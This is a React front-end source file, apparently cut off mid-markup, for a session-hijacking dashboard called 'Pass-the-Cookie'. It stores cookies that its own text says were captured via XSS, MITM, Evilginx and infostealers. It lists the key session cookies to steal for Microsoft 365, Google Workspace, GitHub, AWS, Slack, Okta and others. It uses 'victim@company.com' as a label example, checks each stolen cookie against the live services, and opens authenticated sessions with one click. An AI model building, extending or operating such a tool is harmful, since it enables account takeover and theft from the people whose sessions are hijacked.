import { useState, useEffect } from 'react';
import {
  Box, Flex, Text, Heading, Button, Input, Textarea,
  SimpleGrid, Spinner, Modal, ModalOverlay, ModalContent, ModalBody, IconButton,
} from '@chakra-ui/react';
import { motion, AnimatePresence } from 'framer-motion';
import { AddIcon, DeleteIcon, CopyIcon, CheckIcon, RepeatIcon, CloseIcon, InfoIcon } from '@chakra-ui/icons';

const MotionBox = motion(Box);

const BLUE   = '#63B3ED';
const GREEN  = '#68D391';
const RED    = '#FC8181';
const ORANGE = '#F6AD55';
const PURPLE = '#9F7AEA';
const CYAN   = '#76E4F7';
const YELLOW = '#ECC94B';

const API = process.env.REACT_APP_API_URL || 'http://localhost:5000/api';
const authHdr = () => ({
  'Content-Type': 'application/json',
  Authorization: `Bearer ${localStorage.getItem('token') || ''}`,
});

// ── App catalog ───────────────────────────────────────────────────────────────
const SAAS_APPS = [
  {
    key: 'microsoft365',
    label: 'Microsoft 365',
    color: '#0078D4',
    openUrl: 'https://www.office.com/',
    cookieHints: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'buid', 'esctx'],
    icon: (
      <Box as="svg" viewBox="0 0 23 23" w="22px" h="22px" fill="none">
        <path fill="#f3f3f3" d="M0 0h23v23H0z"/>
        <path fill="#f35325" d="M1 1h10v10H1z"/>
        <path fill="#81bc06" d="M12 1h10v10H12z"/>
        <path fill="#05a6f0" d="M1 12h10v10H1z"/>
        <path fill="#ffba08" d="M12 12h10v10H12z"/>
      </Box>
    ),
  },
  {
    key: 'google',
    label: 'Google Workspace',
    color: '#4285F4',
    openUrl: 'https://myaccount.google.com/',
    cookieHints: ['__Secure-3PSID', 'SAPISID', 'SID', 'SSID', 'APISID', 'HSID', '__Secure-1PSID'],
    icon: (
      <Box as="svg" viewBox="0 0 24 24" w="22px" h="22px">
        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
      </Box>
    ),
  },
  {
    key: 'github',
    label: 'GitHub',
    color: '#f0f6fc',
    openUrl: 'https://github.com/',
    cookieHints: ['user_session', '__Host-user_session_same_site', 'logged_in', 'dotcom_user', '_gh_sess'],
    icon: (
      <Box as="svg" viewBox="0 0 24 24" w="22px" h="22px" fill="#f0f6fc">
        <path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/>
      </Box>
    ),
  },
  {
    key: 'aws',
    label: 'AWS Console',
    color: '#FF9900',
    openUrl: 'https://console.aws.amazon.com/',
    cookieHints: ['aws-creds', 'session-id', 'session-id-time', 'ubid-main', 'x-main', 'at-main'],
    icon: (
      <Box as="svg" viewBox="0 0 24 24" w="22px" h="22px" fill="#FF9900">
        <path d="M6.763 10.036c0 .296.032.535.088.71.064.176.144.368.256.576.04.064.056.128.056.184 0 .08-.048.16-.152.24l-.504.336a.383.383 0 0 1-.208.072c-.08 0-.16-.04-.24-.112a2.47 2.47 0 0 1-.288-.376 6.18 6.18 0 0 1-.248-.472c-.624.736-1.408 1.104-2.352 1.104-.672 0-1.208-.192-1.6-.576-.392-.384-.592-.896-.592-1.536 0-.68.24-1.232.728-1.648.488-.416 1.136-.624 1.96-.624.272 0 .552.024.848.064.296.04.6.104.92.176v-.584c0-.608-.128-1.032-.376-1.28-.256-.248-.688-.368-1.304-.368-.28 0-.568.032-.864.104-.296.072-.584.16-.864.272-.128.056-.224.088-.28.104a.488.488 0 0 1-.128.024c-.112 0-.168-.08-.168-.248v-.392c0-.128.016-.224.056-.28a.597.597 0 0 1 .224-.168 5.39 5.39 0 0 1 .952-.336 4.62 4.62 0 0 1 1.2-.152c.912 0 1.584.208 2.016.624.424.416.64 1.048.64 1.896v2.496zm-3.24 1.212c.264 0 .536-.048.824-.144.288-.096.544-.272.76-.512.128-.152.224-.32.272-.512.048-.192.08-.424.08-.696v-.336a6.8 6.8 0 0 0-.736-.136 6.03 6.03 0 0 0-.752-.048c-.536 0-.928.104-1.192.32-.264.216-.392.52-.392.912 0 .368.096.648.296.832.192.192.464.32.84.32zm6.44.836c-.144 0-.24-.024-.304-.08-.064-.048-.12-.16-.168-.312L7.58 5.82a1.4 1.4 0 0 1-.072-.32c0-.128.064-.2.192-.2h.784c.152 0 .256.024.312.08.064.048.112.16.16.312l1.336 5.268 1.24-5.268c.04-.16.088-.264.152-.312a.533.533 0 0 1 .32-.08h.64c.152 0 .256.024.32.08.064.048.12.16.152.312l1.256 5.332 1.376-5.332c.048-.16.104-.264.16-.312.064-.048.168-.08.312-.08h.744c.128 0 .2.064.2.2 0 .04-.008.08-.016.128a1.137 1.137 0 0 1-.056.2l-1.938 6.132c-.048.16-.104.264-.168.312a.52.52 0 0 1-.304.08h-.688c-.152 0-.256-.024-.32-.08-.064-.056-.12-.16-.152-.32L12.9 7.648l-1.228 4.86c-.04.16-.088.264-.152.32-.064.056-.176.08-.32.08h-.688zm10.176.24a7.6 7.6 0 0 1-1.768-.208c-.568-.144-.96-.296-1.184-.464-.136-.096-.168-.2-.168-.296v-.408c0-.168.064-.248.184-.248.048 0 .096.008.144.024.048.016.12.048.2.08.272.12.568.216.888.28.328.064.648.096.976.096.52 0 .92-.088 1.196-.264a.864.864 0 0 0 .42-.772.784.784 0 0 0-.216-.556c-.144-.152-.416-.288-.808-.416l-1.16-.36c-.584-.184-1.016-.456-1.284-.816a1.953 1.953 0 0 1-.408-1.212c0-.352.076-.664.224-.936.152-.272.352-.512.608-.704.256-.2.544-.348.88-.452.336-.104.688-.152 1.056-.152.184 0 .376.008.56.04.192.024.368.064.536.104.16.048.312.096.456.152.144.056.256.112.336.168a.692.692 0 0 1 .24.208.48.48 0 0 1 .072.272v.376c0 .168-.064.256-.184.256a.83.83 0 0 1-.304-.096 3.652 3.652 0 0 0-1.544-.312c-.472 0-.84.072-1.096.232-.256.16-.384.4-.384.736 0 .216.08.4.24.552.16.152.456.304.88.44l1.136.36c.576.184.992.44 1.24.768.248.328.368.704.368 1.12 0 .36-.072.688-.216.976-.152.288-.36.544-.624.752-.264.216-.584.376-.944.488a4.068 4.068 0 0 1-1.216.176z"/>
      </Box>
    ),
  },
  {
    key: 'slack',
    label: 'Slack',
    color: '#4A154B',
    openUrl: 'https://app.slack.com/',
    cookieHints: ['d', 'd-s', 'b', 'x'],
    icon: (
      <Box as="svg" viewBox="0 0 24 24" w="22px" h="22px" fill="none">
        <path fill="#E01E5A" d="M5.042 15.165a2.528 2.528 0 0 1-2.52 2.523A2.528 2.528 0 0 1 0 15.165a2.527 2.527 0 0 1 2.522-2.52h2.52v2.52zM6.313 15.165a2.527 2.527 0 0 1 2.521-2.52 2.527 2.527 0 0 1 2.521 2.52v6.313A2.528 2.528 0 0 1 8.834 24a2.528 2.528 0 0 1-2.521-2.522v-6.313z"/>
        <path fill="#36C5F0" d="M8.834 5.042a2.528 2.528 0 0 1-2.521-2.52A2.528 2.528 0 0 1 8.834 0a2.528 2.528 0 0 1 2.521 2.522v2.52H8.834zM8.834 6.313a2.528 2.528 0 0 1 2.521 2.521 2.528 2.528 0 0 1-2.521 2.521H2.522A2.528 2.528 0 0 1 0 8.834a2.528 2.528 0 0 1 2.522-2.521h6.312z"/>
        <path fill="#2EB67D" d="M18.956 8.834a2.528 2.528 0 0 1 2.522-2.521A2.528 2.528 0 0 1 24 8.834a2.528 2.528 0 0 1-2.522 2.521h-2.522V8.834zM17.688 8.834a2.528 2.528 0 0 1-2.523 2.521 2.527 2.527 0 0 1-2.52-2.521V2.522A2.527 2.527 0 0 1 15.165 0a2.528 2.528 0 0 1 2.523 2.522v6.312z"/>
        <path fill="#ECB22E" d="M15.165 18.956a2.528 2.528 0 0 1 2.523 2.522A2.528 2.528 0 0 1 15.165 24a2.527 2.527 0 0 1-2.52-2.522v-2.522h2.52zM15.165 17.688a2.527 2.527 0 0 1-2.52-2.523 2.526 2.526 0 0 1 2.52-2.52h6.313A2.527 2.527 0 0 1 24 15.165a2.528 2.528 0 0 1-2.522 2.523h-6.313z"/>
      </Box>
    ),
  },
  {
    key: 'gitlab',
    label: 'GitLab',
    color: '#FC6D26',
    openUrl: 'https://gitlab.com/',
    cookieHints: ['_gitlab_session', 'known_sign_in', 'event_filter'],
    icon: (
      <Box as="svg" viewBox="0 0 24 24" w="22px" h="22px" fill="#FC6D26">
        <path d="M22.65 14.39L12 22.13 1.35 14.39a.84.84 0 0 1-.3-.94l1.22-3.78 2.44-7.51A.42.42 0 0 1 4.82 2a.43.43 0 0 1 .58 0 .42.42 0 0 1 .11.18l2.44 7.49h8.1l2.44-7.51A.42.42 0 0 1 18.6 2a.43.43 0 0 1 .58 0 .42.42 0 0 1 .11.18l2.44 7.51L23 13.45a.84.84 0 0 1-.35.94z"/>
      </Box>
    ),
  },
  {
    key: 'atlassian',
    label: 'Atlassian',
    color: '#0052CC',
    openUrl: 'https://id.atlassian.com/',
    cookieHints: ['cloud.session.token', 'atl.xsrf.token', 'JSESSIONID', 'ajs_anonymous_id'],
    icon: (
      <Box as="svg" viewBox="0 0 24 24" w="22px" h="22px" fill="#0052CC">
        <path d="M.85 14.56a.76.76 0 0 0-.05 1.08l5.42 5.88a.76.76 0 0 0 1.08.05l.05-.05 5.12-5.55a5.77 5.77 0 0 0-11.62-1.41zM12 8.3a5.77 5.77 0 0 0-5.77 5.77c0 .63.1 1.23.28 1.8L12 22.48l5.49-6.61A5.77 5.77 0 0 0 12 8.3zm.13-7.29a.76.76 0 0 0-1.08.05L5.93 7.94a5.77 5.77 0 0 0 11.62 1.41.76.76 0 0 0 .05-1.08z"/>
      </Box>
    ),
  },
  {
    key: 'okta',
    label: 'Okta',
    color: '#007DC1',
    openUrl: 'https://company.okta.com/',
    cookieHints: ['sid', 'idx', 'DT'],
    extraFields: [{ key: 'domain', label: 'Okta Domain', placeholder: 'company.okta.com' }],
    icon: (
      <Box as="svg" viewBox="0 0 24 24" w="22px" h="22px" fill="#007DC1">
        <path d="M12 0C5.389 0 0 5.389 0 12s5.389 12 12 12 12-5.389 12-12S18.611 0 12 0zm0 18c-3.314 0-6-2.686-6-6s2.686-6 6-6 6 2.686 6 6-2.686 6-6 6z"/>
      </Box>
    ),
  },
];

// ── Helpers ───────────────────────────────────────────────────────────────────
function CopyBtn({ text }) {
  const [copied, setCopied] = useState(false);
  return (
    <Button size="xs" variant="ghost" p={1} minW="unset" h="auto"
      color={copied ? GREEN : 'var(--dash-text-muted)'}
      _hover={{ color: copied ? GREEN : 'white' }}
      onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 1500); }}>
      {copied ? <CheckIcon boxSize={2.5} /> : <CopyIcon boxSize={2.5} />}
    </Button>
  );
}

const TabBtn = ({ label, active, color, onClick }) => (
  <Button size="sm" variant="ghost" borderRadius="8px"
    color={active ? color : 'var(--dash-text-muted)'}
    bg={active ? `${color}18` : 'transparent'}
    border={active ? `1px solid ${color}40` : '1px solid transparent'}
    fontWeight={active ? 'semibold' : 'normal'}
    fontSize="12px" px={4}
    _hover={{ bg: `${color}12`, color }}
    onClick={onClick}>
    {label}
  </Button>
);

const inputSx = {
  variant: 'unstyled',
  bg: 'rgba(255,255,255,0.05)',
  border: '1px solid rgba(255,255,255,0.1)',
  borderRadius: '10px',
  px: 4, h: '40px', fontSize: 'sm',
  color: 'var(--dash-text-primary)',
  _placeholder: { color: 'var(--dash-text-muted)' },
  _hover: { border: `1px solid ${BLUE}50` },
  _focus: { border: `1px solid ${BLUE}80`, boxShadow: `0 0 0 1px ${BLUE}40` },
};

function parseCookieString(raw) {
  return raw.split(/;\s*/).map((c) => {
    const idx = c.indexOf('=');
    if (idx === -1) return null;
    return { name: c.slice(0, idx).trim(), value: c.slice(idx + 1).trim() };
  }).filter(Boolean);
}

function timeAgo(ts) {
  const d = (Date.now() - ts) / 1000;
  if (d < 60) return `${Math.round(d)}s ago`;
  if (d < 3600) return `${Math.round(d / 60)}m ago`;
  if (d < 86400) return `${Math.round(d / 3600)}h ago`;
  return `${Math.round(d / 86400)}d ago`;
}

// ── Cookie Entry Component ────────────────────────────────────────────────────
function CookieCard({ entry, onDelete, onTest, onOpenSession, testing }) {
  const [expanded, setExpanded] = useState(false);
  const cookies = parseCookieString(entry.cookieString);
  const appDef = SAAS_APPS.find((a) => a.key === entry.app);
  const color = appDef?.color || BLUE;

  const statusColor =
    entry.status === 'valid'   ? GREEN  :
    entry.status === 'invalid' ? RED    :
    entry.status === 'testing' ? YELLOW : 'var(--dash-text-muted)';

  return (
    <MotionBox initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }}>
      <Box bg="rgba(255,255,255,0.03)" border="1px solid rgba(255,255,255,0.07)"
        borderRadius="14px" overflow="hidden"
        _hover={{ borderColor: `${color}30` }} transition="border-color 0.15s">
        <Box h="2px" bgGradient={`linear(to-r, ${color}, ${color}00)`} />
        <Box p={4}>
          {/* Header */}
          <Flex justify="space-between" align="flex-start" mb={3}>
            <Flex align="center" gap={3}>
              {/* App icon */}
              <Flex w="36px" h="36px" borderRadius="10px"
                bg="rgba(255,255,255,0.06)" border={`1px solid ${color}30`}
                align="center" justify="center" flexShrink={0}>
                {appDef?.icon}
              </Flex>
              <Box>
                <Flex align="center" gap={2}>
                  <Text fontSize="13px" fontWeight="semibold" color="white">
                    {appDef?.label || entry.app}
                  </Text>
                  {entry.status && (
                    <Box px={2} py="1px" borderRadius="5px"
                      bg={`${statusColor}20`} border={`1px solid ${statusColor}40`}>
                      <Text fontSize="9px" color={statusColor} fontWeight="bold">
                        {entry.status === 'testing' ? 'TESTING...' : entry.status.toUpperCase()}
                      </Text>
                    </Box>
                  )}
                </Flex>
                <Text fontSize="11px" color="var(--dash-text-muted)" mt={0.5}>
                  {entry.label || `${cookies.length} cookie(s)`}
                  {entry.testedAt && ` · tested ${timeAgo(entry.testedAt)}`}
                </Text>
              </Box>
            </Flex>
            <Flex gap={2}>
              <Button size="xs" borderRadius="6px" variant="ghost"
                color={color} bg={`${color}15`} border={`1px solid ${color}30`}
                _hover={{ bg: `${color}25` }}
                isLoading={testing}
                onClick={() => onTest(entry)}>
                Test
              </Button>
              {entry.status === 'valid' && (
                <Button size="xs" borderRadius="6px" variant="ghost"
                  color={GREEN} bg={`${GREEN}15`} border={`1px solid ${GREEN}30`}
                  _hover={{ bg: `${GREEN}25` }}
                  onClick={() => onOpenSession(entry)}>
                  Open Session ↗
                </Button>
              )}
              <Button size="xs" variant="ghost" p={1} color="var(--dash-text-muted)"
                _hover={{ color: RED, bg: `${RED}15` }}
                onClick={() => onDelete(entry.id)}>
                <DeleteIcon boxSize={3} />
              </Button>
            </Flex>
          </Flex>

          {/* User info if captured */}
          {entry.user && (
            <Flex align="center" gap={3} mb={3} px={3} py={2}
              bg={`${GREEN}08`} borderRadius="8px" border={`1px solid ${GREEN}20`}>
              <Box w="24px" h="24px" borderRadius="full" bg={`${GREEN}25`}
                display="flex" alignItems="center" justifyContent="center" flexShrink={0}>
                <Text fontSize="9px" color={GREEN} fontWeight="bold">
                  {(entry.user.name || '?')[0].toUpperCase()}
                </Text>
              </Box>
              <Box>
                <Text fontSize="12px" color={GREEN} fontWeight="medium">{entry.user.name || '—'}</Text>
                {entry.user.email && <Text fontSize="10px" color="var(--dash-text-muted)">{entry.user.email}</Text>}
                {entry.user.extra && <Text fontSize="10px" color="var(--dash-text-muted)">{entry.user.extra}</Text>}
              </Box>
              <Text fontSize="10px" color={GREEN} ml="auto">{entry.detail}</Text>
            </Flex>
          )}

          {/* Error detail */}
          {entry.status === 'invalid' && entry.detail && (
            <Box mb={3} px={3} py={2} bg={`${RED}08`} borderRadius="8px" border={`1px solid ${RED}20`}>
              <Text fontSize="11px" color={RED}>{entry.detail}</Text>
            </Box>
          )}

          {/* Cookie list toggle */}
          <Flex justify="space-between" align="center">
            <Text fontSize="10px" color="var(--dash-text-muted)">{cookies.length} cookies stored</Text>
            <Button size="xs" variant="ghost" color="var(--dash-text-muted)"
              _hover={{ color: 'white' }} onClick={() => setExpanded((v) => !v)}>
              {expanded ? '▲ Hide cookies' : '▼ Show cookies'}
            </Button>
          </Flex>

          {expanded && (
            <Box mt={3} bg="rgba(0,0,0,0.3)" borderRadius="8px" p={3}
              border="1px solid rgba(255,255,255,0.06)"
              maxH="180px" overflowY="auto"
              css={{ '&::-webkit-scrollbar': { width: '3px' }, '&::-webkit-scrollbar-thumb': { background: 'rgba(255,255,255,0.12)', borderRadius: '3px' } }}>
              {cookies.map((c, i) => (
                <Flex key={i} justify="space-between" align="center" py={1}
                  borderBottom="1px solid rgba(255,255,255,0.04)">
                  <Flex gap={2} flex={1} minW={0}>
                    <Text fontSize="10px" color={color} fontFamily="monospace" flexShrink={0}>{c.name}</Text>
                    <Text fontSize="10px" color="var(--dash-text-muted)" fontFamily="monospace" noOfLines={1}>
                      = {c.value.slice(0, 48)}{c.value.length > 48 ? '…' : ''}
                    </Text>
                  </Flex>
                  <CopyBtn text={`${c.name}=${c.value}`} />
                </Flex>
              ))}
            </Box>
          )}
        </Box>
      </Box>
    </MotionBox>
  );
}

// ── Label ─────────────────────────────────────────────────────────────────────
const Label = ({ children }) => (
  <Text fontSize="10px" color="var(--dash-text-muted)" textTransform="uppercase"
    letterSpacing="wider" fontWeight="bold" mb={1.5}>{children}</Text>
);

// ── Add Cookie Modal ──────────────────────────────────────────────────────────
function AddCookieModal({ onClose, onAdd }) {
  const [selectedApp, setSelectedApp] = useState(SAAS_APPS[0]);
  const [cookieString, setCookieString] = useState('');
  const [label, setLabel] = useState('');
  const [extraVals, setExtraVals] = useState({});

  const appDef     = SAAS_APPS.find((a) => a.key === selectedApp.key);
  const cookieCount = parseCookieString(cookieString).length;

  const handleAdd = () => {
    if (!cookieString.trim()) return;
    onAdd({
      id: Date.now(),
      app: selectedApp.key,
      cookieString: cookieString.trim(),
      label: label.trim() || `${selectedApp.label} session`,
      extra: extraVals,
      status: null, user: null, detail: null, testedAt: null, addedAt: Date.now(),
    });
    onClose();
  };

  return (
    <Modal isOpen onClose={onClose} isCentered size="lg">
      <ModalOverlay bg="rgba(0,0,0,0.65)" backdropFilter="blur(6px)" />
      <ModalContent bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
        borderRadius="16px" overflow="hidden" p={0} maxH="90vh"
        css={{ '&::-webkit-scrollbar': { width: '3px' }, '&::-webkit-scrollbar-thumb': { background: 'rgba(255,255,255,0.1)', borderRadius: '3px' } }}>
        <ModalBody p={0} overflowY="auto">
          <Box p={6} pos="relative">
            {/* Top gradient line */}
            <Box pos="absolute" top="0" left="0" right="0" h="2px"
              style={{ background: `linear-gradient(to right, transparent, ${GREEN}80, transparent)` }} />

            {/* Header */}
            <Flex justify="space-between" align="flex-start" mb={5}>
              <Flex align="center" gap={3}>
                <Flex w="38px" h="38px" borderRadius="10px" align="center" justify="center"
                  bg={`${GREEN}15`} border={`1px solid ${GREEN}35`} flexShrink={0}>
                  <Box as="svg" viewBox="0 0 24 24" fill="none" stroke={GREEN} strokeWidth="2"
                    strokeLinecap="round" strokeLinejoin="round" w="18px" h="18px">
                    <path d="M21 2H3v16h5v4l4-4h9V2zM11 11V7M16 11V7"/>
                  </Box>
                </Flex>
                <Box>
                  <Text fontSize="14px" fontWeight="bold" color="var(--dash-text-primary)">Add Cookie Session</Text>
                  <Text fontSize="11px" color="var(--dash-text-muted)" mt="2px">
                    Captured via XSS &middot; MITM &middot; Evilginx &middot; Infostealer
                  </Text>
                </Box>
              </Flex>
              <IconButton icon={<CloseIcon boxSize={2.5} />} size="xs" variant="ghost"
                color="var(--dash-text-muted)" borderRadius="8px"
                _hover={{ color: 'white', bg: 'rgba(255,255,255,0.06)' }}
                onClick={onClose} aria-label="Close" />
            </Flex>

            {/* Target App */}
            <Box mb={4}>
              <Label>Target App</Label>
              <Flex gap={2} flexWrap="wrap">
                {SAAS_APPS.map((app) => (
                  <Button key={app.key} size="sm" variant="ghost" borderRadius="8px"
                    h="34px" px={3} gap={2}
                    color={selectedApp.key === app.key ? app.color : 'var(--dash-text-muted)'}
                    bg={selectedApp.key === app.key ? `${app.color}18` : 'rgba(255,255,255,0.04)'}
                    border={`1px solid ${selectedApp.key === app.key ? `${app.color}45` : 'rgba(255,255,255,0.08)'}`}
                    _hover={{ bg: `${app.color}12`, color: app.color }}
                    onClick={() => { setSelectedApp(app); setExtraVals({}); }}>
                    <Box flexShrink={0}>{app.icon}</Box>
                    <Text fontSize="12px">{app.label}</Text>
                  </Button>
                ))}
              </Flex>
            </Box>

            {/* Session label */}
            <Box mb={3}>
              <Label>Session Label</Label>
              <Input {...inputSx} value={label} onChange={(e) => setLabel(e.target.value)}
                placeholder={`e.g. victim@company.com — ${selectedApp.label}`} />
            </Box>

            {/* Extra fields (e.g. Okta domain) */}
            {appDef?.extraFields?.map((f) => (
              <Box key={f.key} mb={3}>
                <Label>{f.label}</Label>
                <Input {...inputSx} value={extraVals[f.key] || ''} placeholder={f.placeholder}
                  onChange={(e) => setExtraVals((p) => ({ ...p, [f.key]: e.target.value }))} />
              </Box>
            ))}

            {/* Cookie hints */}
            {appDef?.cookieHints?.length > 0 && (
              <Box mb={4} px={3} py={2.5} bg={`${selectedApp.color}08`} borderRadius="10px"
                border={`1px solid ${selectedApp.color}20`}>
                <Flex align="center" gap={1.5} mb={2}>
                  <InfoIcon boxSize={3} color={BLUE} />
                  <Text fontSize="10px" color={BLUE} fontWeight="semibold">
                    Key cookies to capture for {selectedApp.label}
                  </Text>
                </Flex>
                <Flex gap={1.5} flexWrap="wrap">
                  {appDef.cookieHints.map((h) => (
                    <Box key={h} px={2} py="2px" borderRadius="5px"
                      bg="rgba(99,179,237,0.1)" border="1px solid rgba(99,179,237,0.2)">
                      <Text fontSize="10px" fontFamily="monospace" color={BLUE}>{h}</Text>
                    </Box>
                  ))}
                </Flex>
              </Box>
            )}

            {/* Cookie string */}
            <Box mb={5}>
              <Flex justify="space-between" align="center" mb={1.5}>
                <Label>Cookie String</Label>
                {cookieString && cookieCount > 0 && (
                  <Flex align="center" gap={1}>
                    <CheckIcon boxSize={2.5} color={GREEN} />
                    <Text fontSize="10px" color={GREEN} fontWeight="semibold">
                      {cookieCount} cookie{cookieCount !== 1 ? 's' : ''} detected
                    </Text>
                  </Flex>
                )}
              </Flex>
              <Textarea value={cookieString} onChange={(e) => setCookieString(e.target.value)}
                rows={5} bg="rgba(0,0,0,0.3)" border="1px solid rgba(255,255,255,0.1)"
                borderRadius="10px" fontSize="11px" fontFamily="monospace"
                color="var(--dash-text-primary)" resize="vertical"
                placeholder="ESTSAUTH=eyJ...; ESTSAUTHPERSISTENT=eyJ...; buid=..."
                _placeholder={{ color: 'var(--dash-text-muted)' }}
                _hover={{ borderColor: `${GREEN}40` }}
                _focus={{ borderColor: `${GREEN}60`, boxShadow: `0 0 0 1px ${GREEN}30` }} />
              <Text fontSize="10px" color="var(--dash-text-muted)" mt={1.5}>
                Paste the raw Cookie header value (name=value; name2=value2; ...)
              </Text>
            </Box>

            {/* Actions */}
            <Flex justify="flex-end" gap={3}>
              <Button size="sm" variant="ghost" h="36px" px={5} borderRadius="10px"
                color="var(--dash-text-muted)" _hover={{ color: 'white', bg: 'rgba(255,255,255,0.06)' }}
                onClick={onClose}>
                Cancel
              </Button>
              <Button size="sm" h="36px" px={6} borderRadius="10px" fontWeight="semibold"
                bg={`${GREEN}20`} color={GREEN} border={`1px solid ${GREEN}50`}
                _hover={{ bg: `${GREEN}30` }} isDisabled={!cookieString.trim()}
                onClick={handleAdd}>
                Add to Vault
              </Button>
            </Flex>
          </Box>
        </ModalBody>
      </ModalContent>
    </Modal>
  );
}

// ── Main Component ────────────────────────────────────────────────────────────
const PassCookieView = () => {
  const [tab, setTab]           = useState('vault');
  const [entries, setEntries]   = useState(() => {
    try { return JSON.parse(localStorage.getItem('ptc_entries') || '[]'); } catch { return []; }
  });
  const [showAdd, setShowAdd]   = useState(false);
  const [testing, setTesting]   = useState({}); // { id: true }
  const [filterApp, setFilterApp] = useState('all');

  // Persist
  useEffect(() => {
    localStorage.setItem('ptc_entries', JSON.stringify(entries));
  }, [entries]);

  const addEntry = (entry) => setEntries((p) => [entry, ...p]);
  const deleteEntry = (id) => setEntries((p) => p.filter((e) => e.id !== id));

  const testEntry = async (entry) => {
    setTesting((p) => ({ ...p, [entry.id]: true }));
    setEntries((p) => p.map((e) => e.id === entry.id ? { ...e, status: 'testing' } : e));
    try {
      const r = await fetch(`${API}/pass-cookie/test`, {
        method: 'POST', headers: authHdr(),
        body: JSON.stringify({ app: entry.app, cookieString: entry.cookieString, extra: entry.extra }),
      });
      const d = await r.json();
      setEntries((p) => p.map((e) => e.id === entry.id ? {
        ...e,
        status: d.valid ? 'valid' : 'invalid',
        user: d.user || null,
        detail: d.detail || null,
        testedAt: Date.now(),
      } : e));
    } catch (err) {
      setEntries((p) => p.map((e) => e.id === entry.id ? { ...e, status: 'invalid', detail: err.message, testedAt: Date.now() } : e));
    }
    setTesting((p) => ({ ...p, [entry.id]: false }));
  };

  const testAll = async () => {
    for (const e of entries) await testEntry(e);
  };

  const openSession = async (entry) => {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = `${API}/pass-cookie/open-session?app=${entry.app}&t=${localStorage.getItem('token') || ''}`;
    form.target = '_blank';
    const field = document.createElement('input');
    field.type = 'hidden'; field.name = 'cookieString'; field.value = entry.cookieString;
    const extraField = document.createElement('input');
    extraField.type = 'hidden'; extraField.name = 'extra'; extraField.value = JSON.stringify(entry.extra || {});
    form.appendChild(field);
    form.appendChild(extraField);
    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
  };

  const filtered = filterApp === 'all' ? entries : entries.filter((e) => e.app === filterApp);

  const stats = {
    total: entries.length,
    valid: entries.filter((e) => e.status === 'valid').length,
    invalid: entries.filter((e) => e.status === 'invalid').length,
    untested: entries.filter((e) => !e.status).length,
  };

  return (
    <Box px={6} pb={12}>
      {/* Header */}
      <MotionBox initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} mb={6}>
        <Heading fontSize="2xl" color="var(--dash-text-primary)" mb={1}>
          Pass-the-<Text as="span" color="red.400">Cookie</Text>
        </Heading>
        <Text fontSize="sm" color="var(--dash-text-secondary)">
          Store captured browser session cookies, validate them against live SaaS apps, and open authenticated sessions with one click.
        </Text>
      </MotionBox>

      {/* Stats row */}
      <MotionBox initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.05 }} mb={5}>
        <SimpleGrid columns={4} gap={3}>
          {[
            { label: 'Total',    value: stats.total,    color: BLUE   },
            { label: 'Valid',    value: stats.valid,    color: GREEN  },
            { label: 'Invalid',  value: stats.invalid,  color: RED    },
            { label: 'Untested', value: stats.untested, color: YELLOW },
          ].map((s) => (
            <Box key={s.label} bg="rgba(255,255,255,0.03)" border="1px solid rgba(255,255,255,0.07)"
              borderRadius="12px" p={3} textAlign="center">
              <Text fontSize="22px" fontWeight="black" color={s.color}>{s.value}</Text>
              <Text fontSize="11px" color="var(--dash-text-muted)">{s.label}</Text>
            </Box>
          ))}
        </SimpleGrid>
      </MotionBox>

      {/* Tab bar + actions */}
      <MotionBox initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.1 }} mb={5}>
        <Flex justify="space-between" align="center">
          <Flex gap={2}>
            <TabBtn label="Cookie Vault" active={tab === 'vault'} color={GREEN} onClick={() => setTab('vault')} />
            <TabBtn label="App Reference" active={tab === 'reference'} color={BLUE} onClick={() => setTab('reference')} />
          </Flex>
          <Flex gap={2}>
            {entries.length > 0 && (
              <Button size="sm" variant="ghost" leftIcon={<RepeatIcon />}
                color="var(--dash-text-muted)" borderRadius="8px"
                _hover={{ color: 'white', bg: 'rgba(255,255,255,0.07)' }}
                onClick={testAll}>
                Test All
              </Button>
            )}
            <Button size="sm" leftIcon={<AddIcon boxSize={3} />} borderRadius="8px"
              bg={`${GREEN}20`} color={GREEN} border={`1px solid ${GREEN}40`}
              _hover={{ bg: `${GREEN}30` }}
